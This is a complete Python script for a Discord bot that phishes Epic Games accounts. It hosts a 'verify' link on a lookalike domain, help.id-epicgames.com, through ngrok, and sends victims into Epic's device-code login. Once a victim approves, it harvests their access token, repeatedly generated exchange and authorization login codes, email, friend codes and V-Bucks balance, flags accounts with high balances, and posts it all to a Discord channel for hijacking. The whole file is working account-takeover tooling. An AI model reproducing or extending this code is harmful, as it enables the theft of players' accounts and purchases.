#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Discord Bot for Epic Games Authentication with robust message delivery, custom domain, and V-Bucks checking.
- Last Updated: 2025-11-20 03:32:58
"""

# --- SETUP AND INSTALLATION ---
import os
import sys
import subprocess
import requests
import zipfile
import stat
import platform
import time

def run_setup():
    """Ensures all dependencies and ngrok are installed before starting."""
    print("--- Starting initial setup ---")
    
    try:
        import discord
        print("1/3: discord.py is already installed.")
    except ImportError:
        print("1/3: discord.py not found. Installing...")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "discord.py"])
            print("     discord.py installed successfully.")
        except Exception as e:
            print(f"     ERROR: Failed to install discord.py: {e}", file=sys.stderr)
            sys.exit(1)

    ngrok_path = os.path.join(os.getcwd(), "ngrok")
    if not os.path.exists(ngrok_path):
        try:
            print("2/3: Downloading and installing ngrok...")
            machine, system = platform.machine().lower(), platform.system().lower()
            ngrok_url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip"
            if system == "linux" and ("aarch64" in machine or "arm64" in machine):
                ngrok_url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.zip"
            elif system == "darwin":
                 ngrok_url = f"https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-{'arm64' if 'arm' in machine else 'amd64'}.zip"
            elif system == "windows":
                ngrok_url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip"


            with requests.get(ngrok_url, stream=True) as r:
                r.raise_for_status()
                with open("ngrok.zip", "wb") as f:
                    for chunk in r.iter_content(chunk_size=8192): f.write(chunk)
            
            with zipfile.ZipFile("ngrok.zip", "r") as zip_ref: zip_ref.extractall(".")
            os.remove("ngrok.zip")
            if system != "windows":
                os.chmod(ngrok_path, os.stat(ngrok_path).st_mode | stat.S_IEXEC)
            print("     ngrok installed successfully.")
        except Exception as e:
            print(f"     ERROR: Failed to download or set up ngrok: {e}", file=sys.stderr)
            sys.exit(1)
    else:
        print("2/3: ngrok is already installed.")

    authtoken = os.getenv("NGROK_AUTHTOKEN")
    if authtoken:
        try:
            print("3/3: Configuring ngrok authtoken...")
            subprocess.check_call([ngrok_path, "config", "add-authtoken", authtoken], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print("     ngrok authtoken configured.")
        except Exception as e:
            print(f"     WARNING: Failed to configure ngrok authtoken: {e}", file=sys.stderr)
    else:
        print("3/3: NGROK_AUTHTOKEN not set, skipping configuration. This is required for custom domains.")
    print("--- Setup complete ---")

run_setup()

# --- MAIN APPLICATION IMPORTS ---
import logging
import asyncio
import threading
from datetime import datetime
import http.server
import socketserver
import uuid
import traceback
import aiohttp
import discord
from discord.ext import commands

# ==============================================================================
# --- CONFIGURATION AND GLOBALS ---
# ==============================================================================
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger("rift_checker_bot")

DISCORD_BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN")
if not DISCORD_BOT_TOKEN:
    logger.critical("❌ DISCORD_BOT_TOKEN environment variable is not set.")
    sys.exit(1)

CUSTOM_DOMAIN = "help.id-epicgames.com"
REFRESH_INTERVAL = 180 

ngrok_ready = threading.Event()
permanent_link = None
PERMANENT_LINK_ID = str(uuid.uuid4())[:13]

# This global variable is the key to the fix. It will hold the single channel ID.
TARGET_CHANNEL_ID = None

verification_uses = 0
active_sessions = {}
session_lock = threading.Lock()

intents = discord.Intents.default()
intents.guilds = True
bot = commands.Bot(command_prefix="!", intents=intents)
bot.remove_command('help')

# ==============================================================================
# --- EPIC AUTHENTICATION LOGIC (Unchanged) ---
# ==============================================================================
async def create_epic_auth_session():
    EPIC_TOKEN = "OThmN2U0MmMyZTNhNGY4NmE3NGViNDNmYmI0MWVkMzk6MGEyNDQ5YTItMDAxYS00NTFlLWFmZWMtM2U4MTI5MDFjNGQ3"
    async with aiohttp.ClientSession() as sess:
        async with sess.post("https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token", headers={"Authorization": f"basic {EPIC_TOKEN}", "Content-Type": "application/x-www-form-urlencoded"}, data={"grant_type": "client_credentials"}) as r: r.raise_for_status(); token_data = await r.json()
        async with sess.post("https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/deviceAuthorization", headers={"Authorization": f"bearer {token_data['access_token']}"}) as r: r.raise_for_status(); dev_auth = await r.json()
    return {'activation_url': f"https://www.epicgames.com/id/activate?userCode={dev_auth['user_code']}", 'device_code': dev_auth['device_code'], 'interval': 5, 'expires_in': 600}

async def get_exchange_code(access_token):
    try:
        async with aiohttp.ClientSession() as sess:
            async with sess.get("https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/exchange", headers={"Authorization": f"bearer {access_token}"}) as r:
                if r.status == 200: return (await r.json())['code']
    except Exception: return None

async def get_authorization_code(access_token):
    try:
        async with aiohttp.ClientSession() as sess:
            async with sess.get("https://www.epicgames.com/id/api/redirect", headers={"Authorization": f"bearer {access_token}"}, allow_redirects=False) as r:
                if r.status == 200: return (await r.json()).get("authorizationCode")
    except Exception: return None

async def get_stw_codes(access_token, account_id):
    platforms, all_codes, headers = ['epic', 'xbox', 'psn'], [], {"Authorization": f"Bearer {access_token}"}
    async with aiohttp.ClientSession() as sess:
        for p in platforms:
            try:
                async with sess.get(f"https://fngw-mcp-gc-livefn.ol.epicgames.com/fortnite/api/game/v2/friendcodes/{account_id}/{p}", headers=headers) as r:
                    if r.status == 200 and (codes := await r.json()): all_codes.extend([f"{p.upper()}: `{c['codeId']}`" for c in codes])
            except Exception: pass
    return all_codes

async def get_vbucks_balance(access_token, account_id):
    headers = {"Authorization": f"Bearer {access_token}", "Content-Type": "application/json"}
    url = f"https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{account_id}/client/QueryProfile?profileId=athena&profileId=common_core&rvn=-1"
    total_vbucks = 0
    try:
        async with aiohttp.ClientSession() as sess:
            async with sess.post(url, headers=headers, json={}) as r:
                if r.status == 200:
                    for change in (await r.json()).get('profileChanges', []):
                        for item in change.get('profile', {}).get('items', {}).values():
                            if "Currency:Mtx" in item.get('templateId', ''): total_vbucks += item.get('quantity', 0)
    except Exception as e: logger.error(f"V-Bucks check error: {e}")
    return total_vbucks

async def auto_refresh_session(session_id):
    try:
        with session_lock:
            session = active_sessions[session_id]
            is_high_value = session.get('vbucks', 0) > 5000
        logger.info(f"[{session_id}] 🔄 Starting auto-refresh for {session['account_info'].get('displayName')}.")
        while time.time() < session['expires_at']:
            await asyncio.sleep(REFRESH_INTERVAL)
            with session_lock:
                if session['status'] == 'expired': break
                access_token = session['access_token']
            new_code = await get_exchange_code(access_token)
            new_auth = await get_authorization_code(access_token) if is_high_value else None
            if new_code:
                session['refresh_count'] += 1
                await edit_bot_message(session_id, new_exchange_code=new_code, new_auth_code=new_auth)
    except Exception: pass
    finally:
        with session_lock:
            active_sessions[session_id]['status'] = 'expired'
        await edit_bot_message(session_id, status='expired')

def monitor_epic_auth_sync(device_code, interval, expires_in, user_ip):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try: loop.run_until_complete(monitor_epic_auth(device_code, interval, expires_in, user_ip))
    finally: loop.close()

async def monitor_epic_auth(device_code, interval, expires_in, user_ip):
    EPIC_TOKEN = "OThmN2U0MmMyZTNhNGY4NmE3NGViNDNmYmI0MWVkMzk6MGEyNDQ5YTItMDAxYS00NTFlLWFmZWMtM2U4MTI5MDFjNGQ3"
    try:
        async with aiohttp.ClientSession() as sess:
            deadline = time.time() + expires_in
            while time.time() < deadline:
                await asyncio.sleep(interval)
                async with sess.post("https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token", data={"grant_type": "device_code", "device_code": device_code}, headers={"Authorization": f"basic {EPIC_TOKEN}"}) as r:
                    if r.status != 200 or "access_token" not in (data := await r.json()): continue
                    logger.info("✅ User logged in!")
                    access_token, account_id = data['access_token'], data['account_id']
                    async with sess.get(f"https://account-public-service-prod03.ol.epicgames.com/account/api/public/account/{account_id}", headers={"Authorization": f"bearer {access_token}"}) as r_acc: info = await r_acc.json()
                    exchange = await get_exchange_code(access_token)
                    stw = await get_stw_codes(access_token, account_id)
                    vbucks = await get_vbucks_balance(access_token, account_id) if not stw else 0
                    auth = await get_authorization_code(access_token) if vbucks > 5000 else None
                    session_id = str(uuid.uuid4())[:8]
                    with session_lock:
                        # This session is now created with the guaranteed TARGET_CHANNEL_ID
                        active_sessions[session_id] = {'access_token': access_token, 'account_info': info, 'user_ip': user_ip, 'created_at': time.time(), 'last_refresh': time.time(), 'refresh_count': 0, 'expires_at': time.time() + 10800, 'status': 'active', 'message_id': None, 'channel_id': TARGET_CHANNEL_ID, 'stw_codes': stw, 'vbucks': vbucks}
                    bot.loop.create_task(send_new_login_message(session_id, exchange, auth))
                    bot.loop.create_task(auto_refresh_session(session_id))
                    return
    except Exception as e: logger.error(f"❌ Monitoring error: {e}\n{traceback.format_exc()}")

# ==============================================================================
# --- DISCORD BOT LOGIC (WITH ROBUST CHANNEL HANDLING) ---
# ==============================================================================
async def send_new_login_message(session_id, initial_exchange_code, initial_auth_code):
    with session_lock: session = active_sessions[session_id]
    if not (channel := bot.get_channel(session['channel_id'])): return
    embed = build_embed(session_id, initial_exchange_code, initial_auth_code)
    try:
        message = await channel.send(embed=embed)
        session['message_id'] = message.id
    except Exception as e: logger.error(f"Failed to send message: {e}")

async def edit_bot_message(session_id, new_exchange_code=None, new_auth_code=None, status=None):
    with session_lock: session = active_sessions[session_id]
    if not session.get('message_id') or not (channel := bot.get_channel(session['channel_id'])): return
    try:
        message = await channel.fetch_message(session['message_id'])
        embed = build_embed(session_id, new_exchange_code, new_auth_code, status_override=status)
        await message.edit(embed=embed)
    except Exception: pass

def build_embed(session_id, exchange_code=None, auth_code=None, status_override=None):
    with session_lock: session = active_sessions[session_id]
    status, vbucks = status_override or session['status'], session.get('vbucks', 0)
    name = session['account_info'].get('displayName', 'N/A')
    if status == 'active': title, color, desc = f"✅ Logged In: {name}", 0x57F287, f"**{name}** verified!\n\n🔄 *Refreshing for 3 hours.*"
    elif status == 'expired': title, color, desc = f"🔚 Expired: {name}", 0x737373, f"3-hour window for **{name}** has ended."
    else: title, color, desc = f"🔄 Refreshed: {name}", 0x3498DB, f"New codes for **{name}**!"
    if vbucks > 5000: title = f"💎 {title}"
    embed = discord.Embed(title=title, description=desc, color=color, timestamp=datetime.utcnow())
    embed.add_field(name="Name", value=name, inline=True).add_field(name="Email", value=session['account_info'].get('email', 'N/A'), inline=True).add_field(name="ID", value=f"`{session['account_info'].get('id', 'N/A')}`", inline=False)
    if session['stw_codes']: embed.add_field(name="🔑 STW Codes", value="\n".join(session['stw_codes']), inline=False)
    else: embed.add_field(name="<:vbucks:1234567890> V-Bucks", value=f"**{vbucks:,}**", inline=False)
    if exchange_code:
        embed.add_field(name="🔗 Login Link", value=f"**[Click to login](https://www.epicgames.com/id/exchange?exchangeCode={exchange_code})**", inline=False)
        embed.add_field(name="Exchange Code", value=f"```{exchange_code}```", inline=False)
    if auth_code: embed.add_field(name="🔐 Auth Code", value=f"```{auth_code}```", inline=False)
    embed.set_footer(text=f"Refreshes: {session['refresh_count']}" if status != 'expired' else f"Completed with {session['refresh_count']} refreshes.")
    return embed

async def setup_target_channel(guild):
    """This function finds or creates the 'rift-auth' channel and locks it as the target."""
    global TARGET_CHANNEL_ID
    # If we already have a working channel, do nothing.
    if TARGET_CHANNEL_ID and bot.get_channel(TARGET_CHANNEL_ID):
        return

    # Search for the channel.
    target_channel = discord.utils.get(guild.text_channels, name="rift-auth")
    
    if not target_channel:
        try:
            # If it doesn't exist, create it.
            logger.info(f"Channel 'rift-auth' not found in {guild.name}. Creating it...")
            target_channel = await guild.create_text_channel("rift-auth")
            logger.info(f"Successfully created #rift-auth in {guild.name}.")
        except discord.Forbidden:
            logger.error(f"Cannot create channel in {guild.name} due to permissions. Using first available channel as a fallback.")
            target_channel = guild.text_channels[0] # Fallback to any channel if creation fails.
            
    # Lock the channel ID as our target for all future messages.
    TARGET_CHANNEL_ID = target_channel.id
    logger.info(f"✅ Target channel locked to: #{target_channel.name} ({TARGET_CHANNEL_ID}) in {guild.name}")
    
    # Send the startup message to the locked-on channel.
    embed = discord.Embed(title="🚀 Rift Bot Activated", description=f"**Verification Link:**\n`{permanent_link}`", color=0x7289DA)
    await target_channel.send(embed=embed)

@bot.event
async def on_ready():
    global permanent_link
    permanent_link = f"https://{CUSTOM_DOMAIN}/verify/{PERMANENT_LINK_ID}"
    logger.info(f"✅ Bot is online as {bot.user}")
    
    # Start background services.
    threading.Thread(target=run_web_server, args=(8000,), daemon=True).start()
    threading.Thread(target=setup_ngrok_tunnel, args=(8000,), daemon=True).start()

    await bot.wait_until_ready() # Wait until the bot's internal cache is ready.
    if not bot.guilds:
        logger.warning("Bot is not in any servers. Please invite it to a server.")
        return
        
    # Reliably find and set the target channel on startup.
    await setup_target_channel(bot.guilds[0])

@bot.event
async def on_guild_join(guild):
    """When the bot joins a new server, set up the channel there."""
    logger.info(f"Joined new server: {guild.name}. Setting up channel...")
    await setup_target_channel(guild)

# ==============================================================================
# --- WEB SERVER AND NGROK ---
# ==============================================================================
class RequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        global verification_uses
        path_parts = self.path.strip("/").split("/")
        if len(path_parts) == 2 and path_parts[0] == 'verify' and path_parts[1] == PERMANENT_LINK_ID:
            # If the bot hasn't locked a channel yet, tell the user it's not ready.
            if not TARGET_CHANNEL_ID:
                self.send_response(503) # Service Unavailable
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(b"<h1>503 Service Unavailable</h1><p>The bot is starting up and has not yet secured a channel. Please try again in a moment.</p>")
                logger.warning("Verification attempted, but bot is not ready (no target channel).")
                return

            verification_uses += 1
            client_ip = self.headers.get('X-Forwarded-For', self.client_address[0])
            try:
                loop = asyncio.new_event_loop()
                epic_session = loop.run_until_complete(create_epic_auth_session())
                loop.close()
                threading.Thread(target=monitor_epic_auth_sync, args=(epic_session['device_code'], epic_session['interval'], epic_session['expires_in'], client_ip), daemon=True).start()
                self.send_response(302); self.send_header('Location', epic_session['activation_url']); self.end_headers()
            except Exception as e: logger.error(f"Auth session error: {e}"); self.send_error(500)
        else: self.send_error(404); self.end_headers()
            
    def log_message(self, format, *args): pass

def run_web_server(port):
    with socketserver.ThreadingTCPServer(("", port), RequestHandler) as httpd: httpd.serve_forever()

def setup_ngrok_tunnel(port):
    ngrok_executable = os.path.join(os.getcwd(), "ngrok.exe" if platform.system() == "windows" else "ngrok")
    if not os.getenv("NGROK_AUTHTOKEN"): logger.warning("NGROK_AUTHTOKEN not found! Custom domain will fail.")
    logger.info(f"🌐 Starting ngrok for {CUSTOM_DOMAIN}...")
    command = [ngrok_executable, 'http', str(port), f'--domain={CUSTOM_DOMAIN}']
    try:
        subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
        time.sleep(5)
        logger.info(f"✅ ngrok should be live at https://{CUSTOM_DOMAIN}")
        ngrok_ready.set()
    except Exception as e: 
        logger.critical(f"❌ Failed to start ngrok: {e}"); sys.exit(1)

if __name__ == "__main__":
    try: bot.run(DISCORD_BOT_TOKEN)
    except Exception as e: logger.critical(f"❌ Bot failed to run: {e}")
